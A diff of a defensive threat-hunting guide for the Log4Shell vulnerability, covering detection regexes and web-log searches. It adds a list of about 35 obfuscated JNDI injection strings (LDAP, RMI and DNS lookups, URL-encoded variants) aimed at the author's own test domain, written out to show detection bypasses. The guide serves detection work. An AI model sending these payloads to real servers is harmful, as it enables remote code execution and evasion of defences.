@@ -8,12 +8,11 @@ General information about the vulnerability is already available from a number o
 
 
 ### Why Threat Hunt?
-Security Vendors worked hard to keep up with the evolving threats, but there were [many bypasses](#bypass-examples) to the developed prevention and detection signatures and security vendors had to consistently adapt with [new signatures](#example:-palo-alto) as adversaries discovered new ways to bypass in place detections. This meant that even companies with the most recent signatures were very likely targeted attacks that were not detected.  
+Security Vendors worked hard to keep up with the evolving threats, but there were [many bypasses to detection or ways to obfuscate the attack to avoid detection](#obfuscation-examples) to the developed prevention and detection signatures and security vendors had to consistently adapt with [new signatures](#example:-palo-alto) as adversaries discovered new ways to bypass in place detections. This meant that even companies with the most recent signatures were very likely targeted attacks that were not detected.  
 
 Therefore, we will not be relying on Security alerts for our initial scope. These alerts should *not* be ignored and can even been included in the hunt if they contain records of the URL, User-AgentStrings, or other [fields mentioned later](#locations-to-consider-checking) that may contain the attack. However, keep in mind that Threat Hunting is most valuable when it identifies true threats that the SOC has not already triaged. Therefore data from things like NTAs, NG-Firewall HTTP logs or Proxys, or even Web Server logs (which is what we use here for examples) will be more valuable than IPS alerts Log4j attack logs.
 
 Our examples will use web server logs for examples assuming a scenario where the Threat Hunter doesn't have any IPS logs to leverage.
-
 
 ### The Hunter Mindset
 Consider that SOC primarily triages alerts from security controls. Their deliverable is a determination on whether a notable event that has been surfaced requires additional escalation or not.
@@ -196,10 +195,47 @@ ${jndi::ldap://caffeinatedsheep.com/a}
 
 Therefore our searches must account for these bypass method. We will not only have to occasionally modify the regular expression to accommodate for these variations. I have used the following regex to attempt to find instances where bypass techniques are used.
 
-#### Bypass examples
+#### Obfuscation-Examples
 Here we look at some of the obfuscations that actively emerged during response
 **regex:** `((?:\$\{(?:[[:alnum:]]){1,}){1,3}\:.{1,}\})`
 
+A list compiled form referenced resources can be found bellow. Note `caffinatedsheep.com` is not malicious, just a domain I own for testing.
+  
+```
+${jndi:ldap://caffinatedsheep.com/j}
+${jndi:ldap:/caffinatedsheep.com/a}
+${jndi:dns:/caffinatedsheep.com}
+${jndi:dns://caffinatedsheep.com/j}
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://caffinatedsheep.com/j}
+${${::-j}ndi:rmi://caffinatedsheep.com/j}
+${jndi:rmi://domainldap.com/j}
+${${lower:jndi}:${lower:rmi}://caffinatedsheep.com/j}
+${${lower:${lower:jndi}}:${lower:rmi}://caffinatedsheep.com/j}
+${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://caffinatedsheep.com/j}
+${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://caffinatedsheep.com/j}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://caffinatedsheep.com/j}
+${jndi:${lower:l}${lower:d}a${lower:p}://caffinatedsheep.com}
+${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//caffinatedsheep.com/a}
+${jn${env::-}di:ldap://caffinatedsheep.com/j}
+${jn${date:}di${date:':'}ldap://caffinatedsheep.com/j}
+${j${k8s:k5:-ND}i${sd:k5:-:}ldap://caffinatedsheep.com/j}
+${j${main:\k5:-Nd}i${spring:k5:-:}ldap://caffinatedsheep.com/j}
+${j${sys:k5:-nD}${lower:i${web:k5:-:}}ldap://caffinatedsheep.com/j}
+${j${::-nD}i${::-:}ldap://caffinatedsheep.com/j}
+${j${EnV:K5:-nD}i:ldap://caffinatedsheep.com/j}
+${j${loWer:Nd}i${uPper::}ldap://caffinatedsheep.com/j}
+${jndi:ldap://127.0.0.1#caffinatedsheep.com/j}
+${jnd${upper:ı}:ldap://caffinatedsheep.com/j}
+${jnd${sys:SYS_NAME:-i}:ldap:/caffinatedsheep.com/j}
+${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://caffinatedsheep.com/j}
+${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://caffinatedsheep.com/j}
+${${what:ever:-j}${some:thing:-n}${other:thing:-d}${and:last:-i}:ldap://caffinatedsheep.com/j}
+${\u006a\u006e\u0064\u0069:ldap://caffinatedsheep.com/j}
+${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.caffinatedsheep.com/j}
+${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:ı}:}}}ldap://caffinatedsheep.com/j}
+%24%7Bjndi:ldap://caffinatedsheep.com/j%7D
+%24%7Bjn$%7Benv::-%7Ddi:ldap://caffinatedsheep.com/j%7D
+```
 
 **Note:** This regex is not sufficient to catch all forms of bypasses. You can see here  list of bypass examples that this pattern does not match against.
 
@@ -252,12 +288,13 @@ Alternative Options:
 
 - **grep -Po** - Can print only matches; however, only prints the first match. Regex would need to be rewritten as seperate expressions for each match.
 
-`$ cat ./elastic_export.txt | grep -Po1 ':(?:\/){1,2}(?<threat>(?<threat_host>(?:[A-Za-z0-9]|\-|\.){1,})[\/|:](?:(?<threat_port>[0-9]{2,6})|(?<threat_content>(?:[A-Za-z0-9]|\.){1,})))\/(?<threat_record>[A-Za-z0-9]{1,})}'
+`:~$ cat ./elastic_export.txt | grep -Po1 ':(?:\/){1,2}(?<threat>(?<threat_host>(?:[A-Za-z0-9]|\-|\.){1,})[\/|:](?:(?<threat_port>[0-9]{2,6})|(?<threat_content>(?:[A-Za-z0-9]|\.){1,})))\/(?<threat_record>[A-Za-z0-9]{1,})}'
 `
 - **sed -rn** uses different flavor of regex and current syntax will not work.
 
-`sed -rn ':(?:\/){1,2}(?<threat>(?<threat_host>(?:[A-Za-z0-9]|\-|\.){1,})[\/|:](?:(?<threat_port>[0-9]{2,6})|(?<threat_content>(?:[A-Za-z0-9]|\.){1,})))\/(?<threat_record>[A-Za-z0-9]{1,})}' ./tomcat_honeypot_messages_export.txt
-sed: -e expression #1, char 12: unexpected `}'`
+`:~$ sed -rn ':(?:\/){1,2}(?<threat>(?<threat_host>(?:[A-Za-z0-9]|\-|\.){1,})[\/|:](?:(?<threat_port>[0-9]{2,6})|(?<threat_content>(?:[A-Za-z0-9]|\.){1,})))\/(?<threat_record>[A-Za-z0-9]{1,})}' ./tomcat_honeypot_messages_export.txt`
+
+`:~$ sed: -e expression #1, char 12: unexpected `}'`
 
 I will research or write a Python script later to accomplish this.
 
@@ -270,6 +307,9 @@ Notice in the following example there are several types of output. Simple IPs ex
 
 <h1><img src="https://github.com/christian-taillon/log4shell-hunting/blob/main/images/terminal_base64.png" width="700px"></h1>
 
+Using CyberChef in this case is also a solution.
+
+<h1><img src="https://github.com/christian-taillon/log4shell-hunting/blob/main/images/cyber-chef-base64-decoding.png" width="700px"></h1>
 
 ### Successful Attack Identification Base64
 Now that we have a base64 string we can do two things: search for the string in endpoing data (process execution logs that contain command line string) and we can take the extracted network indicators form the base64 commands and use those against our netflow logs.
